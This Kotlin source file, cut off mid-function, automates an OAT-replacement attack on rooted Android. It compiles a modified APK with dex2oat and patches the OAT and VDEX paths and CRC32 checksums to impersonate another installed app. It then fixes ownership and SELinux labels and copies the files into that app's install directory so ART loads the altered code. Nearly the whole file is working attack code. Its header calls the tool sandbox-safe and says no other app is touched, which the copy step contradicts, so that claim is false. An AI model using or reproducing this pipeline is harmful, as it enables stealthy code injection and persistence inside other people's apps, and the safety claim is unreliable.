package spook.horror.artisan

import android.content.Context
import android.net.Uri
import android.util.Log
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

/**
 * Dex2OatRunner — end-to-end lab pipeline that reproduces installd's OAT output
 * shape, plus the Sabanal "Hiding Behind ART" (BlackHat Asia 2015, pp. 15 & 17)
 * path-padding and CRC32 patching.
 *
 * Command shape mirrors what installd emits (only ISA differs by device):
 *
 *   dex2oat
 *     --dex-file=/data/tmp/<pad>/base.apk
 *     --oat-file=<filesDir>/base.odex
 *     --class-loader-context=PCL[]{PCL[/system/framework/android.test.base.jar]}
 *     --instruction-set=<arm64|x86_64|...>
 *
 * Notes on why each of these matters:
 *   - working APK path lives in /data/tmp/, and PADDING GOES IN THE DIRECTORY NAME
 *     ("1" prefix), not in the filename, e.g. /data/tmp/1111...111/base.apk.
 *   - --dex-file points to the APK itself (dex2oat parses classes.dex out of the zip).
 *   - --class-loader-context is the post-API-28 shared-libraries form, with an
 *     android.test.base entry that many apps declare as a <uses-library>.
 *   - --oat-file goes into THIS app's own filesDir, named base.odex (dex2oat
 *     also emits base.vdex alongside).
 *   - After dex2oat, byte-patch the OAT's dex_file_location_data back to the
 *     target install path, and the following 4-byte dex_file_location_checksum
 *     back to the original classes.dex CRC32 (PDF pp. 8-9). This is the whole
 *     point of the "1..1" padding: same length → no offsets shift.
 *   - Permission fixups: chmod 644 + chown 1000:1000 on the odex/vdex
 *     (uid 1000 = "system"), so ART treats the OAT like installd-produced output.
 *   - Log messages `try create oat with dex2oat:` and `oat created with dex2oat -
 *     length=<N>` are emitted via android.util.Log/System.out for step tracing.
 *
 * Sandbox-safe: dex2oat only ever writes into THIS app's own filesDir and into
 * /data/tmp/ (a scratch dir we clean up). The "target install path" is used purely
 * as a STRING patched into the OAT header; nothing is installed, no other app's
 * OAT/dex is touched.
 */
object Dex2OatRunner {

    /**
     * Verbose step-by-step logging toggle (controlled from the UI menu).
     * When false, the pipeline's INFO narration is suppressed; errors (Log.e) always print.
     */
    @Volatile
    @JvmField
    var verbose: Boolean = true

    /**
     * When true (default), the working APK is re-staged with its classesN.dex DEFLATED so
     * dex2oat embeds the modified DEX into the VDEX (self-contained artifact). When false,
     * the picked APK is copied verbatim — the original behavior — which for zipaligned
     * inputs (e.g. anything run through uber-apk-signer / zipalign) yields a partial VDEX:
     * dex2oat mmaps the 4-byte-aligned DEX in place and never copies it in, so at runtime
     * ART falls back to the installed original DEX and structural changes (instrumentation)
     * are lost. Defaulted ON so real-world signed/aligned inputs work out of the box; flip
     * it off from the UI menu to reproduce the raw behavior. See [stageWorkingApkWithCompressedDex].
     */
    @Volatile
    @JvmField
    var embedDexInVdex: Boolean = true

    // Scratch dir, apk name, and out oat name — matching installd's naming.
    private const val WORK_ROOT = "/data/tmp"
    private const val WORK_APK_NAME = "base.apk"
    private const val OAT_FILE_NAME = "base.odex"
    private const val VDEX_FILE_NAME = "base.vdex"


    /**
     * Pipeline against a user-picked APK. Resolves the APK's package name and looks
     * up the corresponding installed app's sourceDir, so the produced OAT can be
     * moved into the RIGHT install dir — via package-name → install-path
     * resolution through PackageManager.
     */
    fun runOnApkUri(context: Context, apkUri: Uri): RunResult {
        logSection("Pipeline start — user picked an APK")
        vlog(TAG, "  picked URI: $apkUri")

        val stageDir = File(context.filesDir, "dex2oat-lab").apply { mkdirs() }
        val stagedApk = File(stageDir, "picked.apk")

        val copyOk = try {
            context.contentResolver.openInputStream(apkUri)?.use { input ->
                stagedApk.outputStream().use { output -> input.copyTo(output) }
            }
            stagedApk.exists() && stagedApk.length() > 0
        } catch (t: Throwable) {
            vlog(TAG, t.message.toString())
            false
        }
        if (!copyOk) {
            Log.e(TAG, "FAIL: could not stage the picked APK from the file picker")
            return errored(apkUri.toString(), "could not copy picked APK from picker")
        }
        vlog(TAG, "  staged apk: ${stagedApk.absolutePath} (${stagedApk.length()} bytes)")

        // Resolve the picked APK's package name → the currently-installed version's
        // sourceDir. This is the whole point of the pipeline: without a real installed
        // target we have nowhere to move the produced OAT to.
        val pkgName = ApkTools.queryApkPackageName(context, stagedApk)
        if (pkgName == null) {
            Log.e(TAG, "FAIL: could not parse package name from picked APK")
            return errored(apkUri.toString(), "could not parse package name from picked APK — is it a valid APK?")
        }
        vlog(TAG, "  parsed package name: $pkgName")

        val installedInfo = ApkTools.resolveInstalledApplicationInfo(context, pkgName)
        if (installedInfo == null) {
            Log.e(TAG, "FAIL: package '$pkgName' is not installed on this device")
            return errored(
                apkUri.toString(),
                "package '$pkgName' is not installed on this device — install it first, then re-run. " +
                    "(We need the target's install-dir to know where to put the OAT.)"
            )
        }
        vlog(TAG, "  installed target found:")
        vlog(TAG, "    sourceDir = ${installedInfo.sourceDir}")
        vlog(TAG, "    uid       = ${installedInfo.uid} (== gid for third-party apps)")
        vlog(TAG, "    sharedLibs= ${installedInfo.sharedLibraryFiles.size} entries: ${installedInfo.sharedLibraryFiles}")

        return runOnApkFile(
            context, stagedApk,
            label = "$pkgName (uid=${installedInfo.uid})",
            targetPackage = pkgName,
            targetInstallPath = installedInfo.sourceDir,
            targetInstallDir = File(installedInfo.sourceDir).parentFile?.absolutePath,
            targetUid = installedInfo.uid,
            sharedLibraryFiles = installedInfo.sharedLibraryFiles,
        )
    }

    /** Force-stop the target so ART drops the old OAT, then relaunch it (root). */
    fun relaunchTarget(pkg: String): Boolean {
        if (pkg.isBlank()) return false
        runAsRoot(listOf("am", "force-stop", pkg))
        val (exit, _, _) = runAsRoot(
            listOf("monkey", "-p", pkg, "-c", "android.intent.category.LAUNCHER", "1"),
        )
        return exit == 0
    }

    private fun logSection(title: String) {
        vlog(TAG, "═══════════════════════════════════════════════════════════")
        vlog(TAG, "  $title")
        vlog(TAG, "═══════════════════════════════════════════════════════════")
    }

    private fun logStep(n: Int, title: String) {
        vlog(TAG, "")
        vlog(TAG, "──── STEP $n: $title ────")
    }

    private fun runOnApkFile(
        context: Context,
        apkFile: File,
        label: String,
        targetPackage: String,
        targetInstallPath: String,
        targetInstallDir: String?,
        targetUid: Int,
        sharedLibraryFiles: List<String>,
    ): RunResult {
        val isa = currentInstructionSet()
        vlog(TAG, "  detected ISA: $isa")

        logStep(1, "Read CRC32s from picked APK and installed target APK")
        vlog(TAG, "  Why: for each classesN.dex, ART cross-checks:")
        vlog(TAG, "         installed_apk.dexN.CRC32 == OAT.header[N].crc == VDEX.crcs[N]")
        vlog(TAG, "       We need the installed CRCs to know what to WRITE into OAT/VDEX,")
        vlog(TAG, "       and the picked CRCs to know what to SEARCH FOR in the VDEX.")

        // Step 1 — CRC32 of the SOURCE APK's classes.dex + CRCs of every classesN.dex
        // in the INSTALLED target APK (the values ART enforces at load time,
        // PDF pp. 8-9). For a multi-dex APK, each classesN.dex has its own
        // OatDexFileHeader entry with its own dex_file_location_checksum — every
        // one must be patched; missing any one causes ART to reject the OAT.
        val originalCrc32 = ApkTools.computeDexCrc32(apkFile)
        if (originalCrc32 < 0) return errored(
            label,
            "picked APK has no classes.dex — is it a split APK (split_config.*.apk) or a bundle (.aab/.xapk)?" +
                " Pick the BASE APK that contains classes.dex."
        )
        val pickedApkCrcs = ApkTools.computeAllDexCrcs(apkFile)
        if (pickedApkCrcs.isEmpty()) return errored(
            label,
            "picked APK has no classes*.dex entries — it looks like a split APK or resource-only APK." +
                " Pick the base APK (usually the largest one, or the one literally named base.apk)."
        )
        val installedApkCrcs = ApkTools.computeAllDexCrcs(File(targetInstallPath))
        if (installedApkCrcs.isEmpty()) return errored(label, "could not read classes*.dex CRCs from installed APK at $targetInstallPath")
        vlog(TAG, "  picked APK classesN.dex CRCs (${pickedApkCrcs.size} entries):")
        pickedApkCrcs.forEach { (name, crc) -> vlog(TAG, "    $name = 0x%08x".format(crc)) }
        vlog(TAG, "  installed APK classesN.dex CRCs (${installedApkCrcs.size} entries):")
        installedApkCrcs.forEach { (name, crc) -> vlog(TAG, "    $name = 0x%08x".format(crc)) }

        logStep(2, "Resolve Class-Loader-Context (CLC)")
        vlog(TAG, "  Why: on API 28+, ART checks that the OAT was compiled with the")
        vlog(TAG, "       same CLC as the app's current class loader hierarchy uses.")
        vlog(TAG, "       Wrong CLC → ART rejects the OAT.")
        vlog(TAG, "  Strategy:")
        vlog(TAG, "    tier 1: read from installed OAT's key_value_store")
        vlog(TAG, "    tier 2: build from PackageManager.sharedLibraryFiles")
        vlog(TAG, "    tier 3: bare PCL[]")

        // Step 1b — resolve the class-loader-context that the target app's installed
        // OAT was compiled with, by reading the exact CLC string from the installed
        // OAT's key_value_store, with two fallbacks (PackageManager shared libraries,
        // then bare PCL[]).
        val (clc, clcSource) = ClcResolver.resolveClassLoaderContext(targetInstallPath, isa, sharedLibraryFiles)
        vlog(TAG, "  resolved CLC: $clc")
        vlog(TAG, "  source: $clcSource")

        logStep(3, "Sabanal path padding — compute working path")
        vlog(TAG, "  Why: we compile to a working path, then byte-patch the OAT to")
        vlog(TAG, "       swap the working path with the target install path. If they're")
        vlog(TAG, "       the same length, nothing shifts — no offsets need updating.")
        vlog(TAG, "  target install path: $targetInstallPath")
        vlog(TAG, "  target length: ${targetInstallPath.length}")

        // Step 2 — pad WORKING PATH to same length as target install path. We pad the
        // DIRECTORY name (not filename): /data/tmp/<N x '1'>/base.apk.
        val fixedPrefix = "$WORK_ROOT/"                   // "/data/tmp/"
        val fixedSuffix = "/$WORK_APK_NAME"               // "/base.apk"
        val overhead = fixedPrefix.length + fixedSuffix.length
        if (targetInstallPath.length < overhead + 1) {
            return errored(
                label,
                "target install path (${targetInstallPath.length}) shorter than min working path (${overhead + 1}) " +
                    "under $WORK_ROOT/ — cannot pad."
            )
        }
        val padCount = targetInstallPath.length - overhead
        val paddedDir = "1".repeat(padCount)
        val workingApkPath = "$fixedPrefix$paddedDir$fixedSuffix"
        vlog(TAG, "  fixed overhead: '$fixedPrefix' + '$fixedSuffix' = $overhead chars")
        vlog(TAG, "  pad count: $padCount ('1' × $padCount)")
        vlog(TAG, "  working apk path: $workingApkPath")
        vlog(TAG, "  working length: ${workingApkPath.length} (must equal target ${targetInstallPath.length})")
        vlog(TAG, "  lengths match: ${workingApkPath.length == targetInstallPath.length}")

        // Standard ART layout: <install-dir>/oat/<isa>/base.odex. We mirror this in our
        // sandbox so the output looks like what installd would have produced — matches
        // where ART expects to find OAT files.
        val outOatDir = "${context.filesDir.absolutePath}/oat/$isa"
        val outOatPath = "$outOatDir/$OAT_FILE_NAME"
        val outVdexPath = "$outOatDir/$VDEX_FILE_NAME"
        vlog(TAG, "  OAT will be produced at: $outOatPath")
        vlog(TAG, "  VDEX will be produced at: $outVdexPath")

        if (!hasRoot()) {
            return RunResult(
                sourceApkPath = label,
                targetPackage = targetPackage,
                rootAvailable = false, command = emptyList(), exitCode = -1,
                stdout = "", stderr = "",
                outDexPath = workingApkPath, outOatPath = outOatPath,
                outOatExists = false, outOatSizeBytes = 0, instructionSet = isa,
                classLoaderContext = clc,
                classLoaderContextSource = clcSource,
                detail = "no su binary found — run on a rooted emulator/device to exercise dex2oat directly",
                originalDexCrc32 = originalCrc32,
                targetInstallPath = targetInstallPath,
                workingDexPath = workingApkPath,
                pathsLengthMatch = workingApkPath.length == targetInstallPath.length,
                installedDexCrcs = installedApkCrcs,
                patchCount = 0, patchApplied = false, patchDetail = "root required",
                patchPerDex = emptyList(),
                vdexPatchCount = 0, vdexPatchApplied = false, vdexPatchDetail = "root required",
                vdexPatchPerDex = emptyList(),
                permissionsApplied = false, permissionsDetail = "root required",
                moveAttempted = false, moveApplied = false,
                movedOdexPath = "", movedVdexPath = "",
                moveDetail = "root required",
            )
        }

        logStep(4, "Prepare scratch dirs")
        vlog(TAG, "  Why: dex2oat needs a fresh output dir. Any stale .odex/.vdex/.art")
        vlog(TAG, "       could confuse the compile, so we wipe them first.")

        // Ensure standard ART oat/<isa>/ output layout exists — dex2oat won't create
        // missing parent dirs. Create as our uid (Kotlin File) first, then chmod as
        // root so root-owned dex2oat can also write there.
        File(outOatDir).mkdirs()
        runAsRoot(listOf("mkdir", "-p", outOatDir))
        runAsRoot(listOf("chmod", "777", outOatDir))
        vlog(TAG, "  created output dir: $outOatDir (mode 777, for root-run dex2oat)")

        // Clean stale outputs: delete .odex/.vdex/.art before recompile.
        runAsRoot(listOf("rm", "-f", outOatPath))
        runAsRoot(listOf("rm", "-f", outVdexPath))
        runAsRoot(listOf("rm", "-f", "$outOatDir/base.art"))
        // Also wipe any old padded working dirs from previous runs.
        runAsRoot(listOf("sh", "-c", "rm -rf $WORK_ROOT/1* 2>/dev/null"))
        vlog(TAG, "  cleaned stale outputs and any prior /data/tmp/1* padded dirs")

        // Re-stage the working APK with its classesN.dex entries DEFLATED (compressed).
        // dex2oat only embeds the DEX into the VDEX when it cannot mmap it from the APK,
        // i.e. when the entry is compressed. Some inputs ship their DEX uncompressed
        // (Stored) — then dex2oat references the DEX in place and produces a VDEX with an
        // EMPTY DexFile section (not self-contained; interpreter/verifier fallback would
        // read the DEX from the *installed* base.apk, i.e. the original code). Forcing the
        // DEX compressed here guarantees dex2oat embeds our MODIFIED DEX into the VDEX, so
        // the artifact carries the modified bytecode for both native and interpreter paths.
        // The DEX CRC-32 (over the uncompressed data) is unchanged, so all downstream
        // checksum patching is unaffected.
        val stagingSource: File
        if (embedDexInVdex) {
            val compressedApk = File(apkFile.parentFile, "working-compressed.apk")
            val recompressedOk = ApkTools.stageWorkingApkWithCompressedDex(apkFile, compressedApk)
            stagingSource = if (recompressedOk) compressedApk else apkFile
            if (recompressedOk) {
                vlog(TAG, "  re-staged working APK with DEFLATED dex: ${compressedApk.absolutePath} (${compressedApk.length()} bytes)")
            } else {
                Log.w(TAG, "  ⚠ dex recompression failed — falling back to verbatim copy (VDEX may omit the embedded DEX)")
            }
        } else {
            // Troubleshooting mode: verbatim copy (original behavior). Toggle "Force embed DEX" on to enable.
            stagingSource = apkFile
            vlog(TAG, "  DEX recompression DISABLED (embedDexInVdex=false) — verbatim copy; VDEX may omit the embedded DEX")
        }

        // Create the padded working dir under /data/tmp and copy source APK into it.
        runAsRoot(listOf("mkdir", "-p", "$fixedPrefix$paddedDir"))
        runAsRoot(listOf("chmod", "777", "$fixedPrefix$paddedDir"))
        val (cpExit, _, cpErr) = runAsRoot(listOf("cp", stagingSource.absolutePath, workingApkPath))
        if (cpExit != 0) {
            Log.e(TAG, "FAIL: cp to $workingApkPath — ${cpErr.trim()}")
            return errored(label, "cp to $workingApkPath failed: ${cpErr.trim()}")
        }
        runAsRoot(listOf("chmod", "644", workingApkPath))
        vlog(TAG, "  copied working apk → $workingApkPath (${File("$fixedPrefix$paddedDir/base.apk").let { if (it.exists()) it.length() else -1 }} bytes)")

        logStep(5, "Run dex2oat")
        vlog(TAG, "  Why: this is the core compilation step — dex2oat translates each")
        vlog(TAG, "       classesN.dex to native machine code and emits base.odex/base.vdex.")
        vlog(TAG, "  Typical duration: 5-15 seconds for a mid-size APK.")

        // Step 3 — invoke dex2oat with the installd-equivalent command shape.
        vlog(TAG, "try create oat with dex2oat:")
        if (verbose) println("try create oat with dex2oat:")
        val command = buildDex2OatCommand(workingApkPath, outOatPath, isa, clc)
        vlog(TAG, "  command:")
        command.forEach { vlog(TAG, "    $it") }
        val (exit, out, err) = runAsRoot(command)

        val oatFile = File(outOatPath)
        val oatExists = oatFile.exists()
        val oatSize = if (oatExists) oatFile.length() else 0L
        vlog(TAG, "  dex2oat exit code: $exit")
        vlog(TAG, "  OAT exists: $oatExists, size: $oatSize bytes")
        if (err.isNotBlank()) vlog(TAG, "  dex2oat stderr: ${err.trim().take(500)}")
        if (oatExists && oatSize > 0) {
            vlog(TAG, "oat created with dex2oat - length=$oatSize")
            if (verbose) println("oat created with dex2oat - length=$oatSize")
        } else {
            Log.e(TAG, "FAIL: dex2oat did not produce an OAT — check stderr above")
        }

        logStep(6, "OAT byte-patch (multi-dex)")
        vlog(TAG, "  Why: the OAT header stores per-DEX 'location' (path) + 'checksum'")
        vlog(TAG, "       (CRC32). Right now they say 'compiled from padded /data/tmp path.'")
        vlog(TAG, "       We rewrite them to say 'compiled from the installed APK's path")
        vlog(TAG, "       with the installed classesN.dex CRC32,' so ART trusts the OAT.")
        vlog(TAG, "  Detection: for each occurrence of the padded path in the OAT bytes,")
        vlog(TAG, "             read the uint32 size prefix 4 bytes before the match.")
        vlog(TAG, "             size == workingPath.length      → main classes.dex entry")

        vlog(TAG, "             size == workingPath.length + N  → check for !classesN.dex")
        vlog(TAG, "             other                            → false positive, skip")

        // Step 4 — multi-dex-aware OAT byte-patch. Every classesN.dex has its own
        // OatDexFileHeader; each gets its dex_file_location_data (padded → target)
        // and dex_file_location_checksum (→ installed target's classesN.dex CRC32)
        // rewritten. Missing any one causes ART to reject the whole OAT.
        var patchCount = 0
        var patchApplied = false
        var patchDetail = "not attempted"
        var patchPerDex: List<String> = emptyList()
        if (oatExists && oatSize > 0) {
            // dex2oat runs as root; make OAT writable by our uid so we can rewrite bytes.
            runAsRoot(listOf("chmod", "666", outOatPath))
            vlog(TAG, "  chmod 666 on OAT so we can write to it from our uid")
            val res = OatVdexPatcher.patchOatMultiDex(oatFile, workingApkPath, targetInstallPath, pickedApkCrcs, installedApkCrcs)
            patchCount = res.patchCount
            patchApplied = res.applied
            patchDetail = res.detail
            patchPerDex = res.perDexDetails
            vlog(TAG, "  OAT patch result: applied=$patchApplied, count=$patchCount")
            patchPerDex.forEach { vlog(TAG, "    - $it") }
            if (patchCount != installedApkCrcs.size) {
                Log.w(TAG, "  ⚠ patched $patchCount of ${installedApkCrcs.size} expected — ART will REJECT this OAT")
            }
        } else {
            patchDetail = "OAT not present — nothing to patch"
            Log.w(TAG, "  skipped: no OAT to patch")
        }

        logStep(7, "VDEX byte-patch (dex_checksums array)")
        vlog(TAG, "  Why: VDEX has its own dex_checksums array. ART checks that")
        vlog(TAG, "       VDEX.crcs[N] == OAT.header[N].crc. If they disagree, ART")
        vlog(TAG, "       rejects both. This is what installd sets up naturally at")
        vlog(TAG, "       install time — we have to REPRODUCE that consistency.")
        vlog(TAG, "  Approach: search for the picked APK's 24-byte CRC sequence in")
        vlog(TAG, "            the VDEX (dex2oat just wrote them there), overwrite")
        vlog(TAG, "            with the installed APK's CRC sequence. Version-agnostic.")

        // Step 4b — VDEX header carries its own dex_checksums array; ART cross-checks
        // this against the OAT's CRCs. Without patching this, ART rejects the OAT
        // even when everything else is correct.
        var vdexPatchCount = 0
        var vdexPatchApplied = false
        var vdexPatchDetail = "not attempted"
        var vdexPatchPerDex: List<String> = emptyList()
        val vdexFile = File(outVdexPath)
        if (vdexFile.exists() && vdexFile.length() > 0) {
            runAsRoot(listOf("chmod", "666", outVdexPath))
            vlog(TAG, "  chmod 666 on VDEX so we can write to it")
            val res = OatVdexPatcher.patchVdexChecksums(vdexFile, pickedApkCrcs, installedApkCrcs)
            vdexPatchCount = res.patchCount
            vdexPatchApplied = res.applied
            vdexPatchDetail = res.detail
            vdexPatchPerDex = res.perDexDetails
            vlog(TAG, "  VDEX patch result: applied=$vdexPatchApplied, count=$vdexPatchCount, detail=$vdexPatchDetail")
            vdexPatchPerDex.forEach { vlog(TAG, "    - $it") }
        } else {
            vdexPatchDetail = "VDEX not present — nothing to patch"
            Log.w(TAG, "  skipped: no VDEX to patch")
        }

        logStep(8, "Permission fixups on the produced OAT/VDEX")
        vlog(TAG, "  Why: right now files are owned by root (dex2oat ran as root).")
        vlog(TAG, "       Target app can't read root-owned files without world-read.")
        vlog(TAG, "       Set owner=system(1000), group=<app_uid>, mode=644 — matches")
        vlog(TAG, "       what installd would produce. Base.apk uses BOTH colon (:)")
        vlog(TAG, "       and dot (.) chown syntax to cover Toybox and BusyBox variants.")

        // Step 5 — permission fixups: chmod 644 + chown to system:<target-app-gid>.
        // Android sets gid == uid for third-party apps, so the group is the target
        // app's own uid — matching installd's `system u0_aNNN` ownership.
        // We do BOTH `chown 1000:<gid>` and `chown 1000.<gid>` — colon form is
        // Toybox/Coreutils, dot form is BusyBox.
        var permsApplied = false
        var permsDetail = "not attempted"
        if (oatExists) {
            val (odexChmodExit, _, odexChmodErr) = runAsRoot(listOf("chmod", "644", outOatPath))
            val (odexChownExit, _, odexChownErr) = runAsRoot(listOf("chown", "1000:$targetUid", outOatPath))
            runAsRoot(listOf("chown", "1000.$targetUid", outOatPath))
            val vdexNote = if (File(outVdexPath).exists()) {
                runAsRoot(listOf("chmod", "644", outVdexPath))
                runAsRoot(listOf("chown", "1000:$targetUid", outVdexPath))
                runAsRoot(listOf("chown", "1000.$targetUid", outVdexPath))
                " + vdex"
            } else ""
            permsApplied = odexChmodExit == 0 && odexChownExit == 0
            permsDetail = if (permsApplied)
                "chmod 644 + chown 1000:$targetUid applied to odex$vdexNote"
            else
                "chmod=$odexChmodExit chown=$odexChownExit stderr=${(odexChmodErr + odexChownErr).trim()}"
            vlog(TAG, "  perms result: $permsDetail")
        } else {
            permsDetail = "OAT not present — nothing to chmod/chown"
            Log.w(TAG, "  skipped: no OAT to fix perms on")
        }

        logStep(9, "Move to target app's install-dir oat/<isa>/")
        vlog(TAG, "  Why: this is the final step — put the patched OAT where ART")
        vlog(TAG, "       expects it: $targetInstallDir/oat/$isa/base.odex")
        vlog(TAG, "  Guard: we ONLY move if all prior steps succeeded. Refusing to")
        vlog(TAG, "         drop a broken OAT that would crash the target on launch.")
        vlog(TAG, "  Critical final touch: restorecon -R to set the SELinux labels")
        vlog(TAG, "                        that ART requires (dalvikcache_data_file).")

        // Step 7 — copy odex+vdex to the target app's install-dir oat/<isa>/ folder.
        // This is the ACTUAL "replace the OAT" step. Only attempted when
        // we have a real install dir (not a synthesized one), and only when patch+perms
        // both succeeded, so we don't leave the target app with a broken OAT.
        var moveAttempted = false
        var moveApplied = false
        var movedOdexPath = ""
        var movedVdexPath = ""
        var moveDetail = "not attempted — no real install dir resolved for the target APK"
        if (targetInstallDir != null && oatExists && oatSize > 0 && patchApplied && vdexPatchApplied && permsApplied) {
            moveAttempted = true
            val installOatDir = "$targetInstallDir/oat/$isa"
            val destOdex = "$installOatDir/$OAT_FILE_NAME"
            val destVdex = "$installOatDir/$VDEX_FILE_NAME"
            movedOdexPath = destOdex
            movedVdexPath = destVdex
            vlog(TAG, "  destination oat dir: $installOatDir")

            val oatParentDir = "$targetInstallDir/oat"
            val (mkExit, _, mkErr) = runAsRoot(listOf("mkdir", "-p", installOatDir))
            if (mkExit != 0) {
                moveDetail = "mkdir $installOatDir failed: ${mkErr.trim()}"
                Log.e(TAG, "FAIL: $moveDetail")
            } else {
                vlog(TAG, "  mkdir -p succeeded")
                // Copy odex
                val (cpOdexExit, _, cpOdexErr) = runAsRoot(listOf("cp", "-f", outOatPath, destOdex))
                val vdexExists = File(outVdexPath).exists()
                val (cpVdexExit, _, cpVdexErr) = if (vdexExists)
                    runAsRoot(listOf("cp", "-f", outVdexPath, destVdex))
                else Triple(0, "", "")
                vlog(TAG, "  cp odex: exit=$cpOdexExit ${if (cpOdexExit != 0) "err=${cpOdexErr.trim()}" else "OK"}")
                if (vdexExists) vlog(TAG, "  cp vdex: exit=$cpVdexExit ${if (cpVdexExit != 0) "err=${cpVdexErr.trim()}" else "OK"}")

                if (cpOdexExit == 0 && cpVdexExit == 0) {
                    // Matches installd's install-dir OAT layout exactly:
                    //   oat/           system:<targetUid>  drwxr-xr-x
                    //   oat/<isa>/     system:<targetUid>  drwxr-xr-x
                    //   base.odex      system:<targetUid>  -rw-r--r--
                    //   base.vdex      system:<targetUid>  -rw-r--r--
                    runAsRoot(listOf("chmod", "755", oatParentDir))
                    runAsRoot(listOf("chown", "1000:$targetUid", oatParentDir))
                    runAsRoot(listOf("chown", "1000.$targetUid", oatParentDir))

                    runAsRoot(listOf("chmod", "755", installOatDir))
                    runAsRoot(listOf("chown", "1000:$targetUid", installOatDir))
                    runAsRoot(listOf("chown", "1000.$targetUid", installOatDir))

                    runAsRoot(listOf("chmod", "644", destOdex))
                    runAsRoot(listOf("chown", "1000:$targetUid", destOdex))
                    runAsRoot(listOf("chown", "1000.$targetUid", destOdex))
                    if (vdexExists) {
                        runAsRoot(listOf("chmod", "644", destVdex))
                        runAsRoot(listOf("chown", "1000:$targetUid", destVdex))
                        runAsRoot(listOf("chown", "1000.$targetUid", destVdex))
                    }
                    // SELinux label — restorecon so ART accepts the file. Must be
                    // applied AFTER chown; recursion covers oat/ and oat/<isa>/.
                    runAsRoot(listOf("restorecon", "-R", oatParentDir))
                    vlog(TAG, "  applied chmod/chown to oat/, oat/$isa, base.odex, base.vdex")
                    vlog(TAG, "  applied restorecon -R on $oatParentDir")

                    moveApplied = true
                    moveDetail = "copied to $installOatDir; oat/ + oat/$isa + files chown'd to 1000:$targetUid (system:app-gid), restorecon -R applied"
                    vlog(TAG, "  ✓ MOVE SUCCEEDED")
                } else {
                    moveDetail = "cp odex=$cpOdexExit vdex=$cpVdexExit stderr=${(cpOdexErr + cpVdexErr).trim()}"
                    Log.e(TAG, "FAIL: $moveDetail")
                }
            }
        } else if (targetInstallDir != null) {
            moveDetail = "skipped — earlier step failed (patch/perms/OAT). Refusing to move a broken OAT into the target's install dir."
            Log.w(TAG, "  skipped move: an earlier step failed. Not risking a broken OAT in the target's install dir.")
        }

        // Clean working dir (leave OAT/vdex behind in filesDir for inspection).
        runAsRoot(listOf("rm", "-rf", "$fixedPrefix$paddedDir"))
        vlog(TAG, "  cleaned /data/tmp/<pad>/ working dir")

        logSection("Pipeline complete")
        vlog(TAG, "  Summary:")
        vlog(TAG, "    dex2oat exit          : $exit")
        vlog(TAG, "    OAT produced          : $oatExists ($oatSize bytes)")
        vlog(TAG, "    OAT entries patched   : $patchCount of ${installedApkCrcs.size} expected")
        vlog(TAG, "    VDEX entries patched  : $vdexPatchCount of ${installedApkCrcs.size} expected")
        vlog(TAG, "    Permissions applied   : $permsApplied")
        vlog(TAG, "    Moved to install dir  : $moveApplied")
        if (moveApplied) {
            vlog(TAG, "  → Next step: force-stop the target app and relaunch it.")
            vlog(TAG, "    ART will load your patched OAT.")
        }

        return RunResult(
            sourceApkPath = label,
            targetPackage = targetPackage,
            rootAvailable = true,
            command = command,
            exitCode = exit,
            stdout = out,
            stderr = err,
            outDexPath = workingApkPath,
            outOatPath = outOatPath,
            outOatExists = oatExists,
            outOatSizeBytes = oatSize,
            instructionSet = isa,
            classLoaderContext = clc,
            classLoaderContextSource = clcSource,
            detail = if (oatExists && oatSize > 0)
                "dex2oat produced a real OAT ($oatSize bytes)"
            else
                "dex2oat did not produce output — check stderr",
            originalDexCrc32 = originalCrc32,
            targetInstallPath = targetInstallPath,
            workingDexPath = workingApkPath,
            pathsLengthMatch = workingApkPath.length == targetInstallPath.length,
            installedDexCrcs = installedApkCrcs,
            patchCount = patchCount,
            patchApplied = patchApplied,
            patchDetail = patchDetail,
            patchPerDex = patchPerDex,
            vdexPatchCount = vdexPatchCount,
            vdexPatchApplied = vdexPatchApplied,
            vdexPatchDetail = vdexPatchDetail,
            vdexPatchPerDex = vdexPatchPerDex,
            permissionsApplied = permsApplied,
            permissionsDetail = permsDetail,
            moveAttempted = moveAttempted,
            moveApplied = moveApplied,
            movedOdexPath = movedOdexPath,
            movedVdexPath = movedVdexPath,
            moveDetail = moveDetail,
        )
    }

// ────────────────────────────── system / arch ──────────────────────────────

    /**
     * Resolves the dex2oat binary. Since API 30 (Android 11) `dex2oat` ships in the
     * ART APEX at `/apex/com.android.art/bin/dex2oat`; older paths remain as
     * fallbacks. We probe via `command -v` under su so we honour whatever PATH the
     * root shell exposes, then fall back to explicit apex/system locations.
     */
    private fun resolveDex2OatPath(): String {
        val (exit, out, _) = runAsRoot(listOf("sh", "-c", "command -v dex2oat"))
        val fromPath = out.trim().lines().firstOrNull()?.takeIf { it.isNotBlank() && exit == 0 }
        if (fromPath != null) return fromPath
        val candidates = listOf(
            "/apex/com.android.art/bin/dex2oat",       // API 30+
            "/apex/com.android.art/bin/dex2oat64",     // API 30+ (64-bit build)
            "/apex/com.android.runtime/bin/dex2oat",   // API 29 transitional apex
            "/system/bin/dex2oat",                     // legacy
        )
        for (c in candidates) {
            val (e, _, _) = runAsRoot(listOf("test", "-x", c))
            if (e == 0) return c
        }
        return "dex2oat"
    }

    private fun buildDex2OatCommand(apkPath: String, oatPath: String, isa: String, clc: String): List<String> {
        val cmd = mutableListOf(
            resolveDex2OatPath(),
            "--dex-file=$apkPath",
            "--oat-file=$oatPath",
            "--class-loader-context=$clc",
            "--instruction-set=$isa",
        )
        // When verbose logging is on, ask dex2oat's own runtime to log at high verbosity.
        // Each `--runtime-arg` forwards the following token to the runtime dex2oat starts.
        // These surface dex2oat's internal decisions (e.g. whether it copies the DEX into
        // the VDEX or references it in place, verification, oat layout) under logcat tag
        // "dex2oat" — the ART/runtime logs needed for root-cause troubleshooting, beyond
        // this runner's own step narration. Logging only; does not change the output.
        if (verbose) {
            listOf("-verbose:oat", "-verbose:dex", "-verbose:compiler", "-verbose:class", "-verbose:verifier")
                .forEach { cat -> cmd.add("--runtime-arg"); cmd.add(cat) }
        }
        return cmd
    }

    private fun currentInstructionSet(): String {
        val abi = android.os.Build.SUPPORTED_ABIS.firstOrNull() ?: "unknown"
        return when {
            abi.startsWith("arm64") -> "arm64"
            abi.startsWith("armeabi") -> "arm"
            abi == "x86_64" -> "x86_64"
            abi == "x86" -> "x86"
            else -> abi
        }
    }

    private val SU_CANDIDATES = listOf("su", "/system/bin/su", "/system/xbin/su", "/su/bin/su")

    private fun hasRoot(): Boolean = SU_CANDIDATES.any { candidate ->
        try {
            val p = ProcessBuilder(candidate, "-c", "id").redirectErrorStream(true).start()
            val out = p.inputStream.bufferedReader().readText()
            p.waitFor()
            out.contains("uid=0")
        } catch (t: Throwable) {
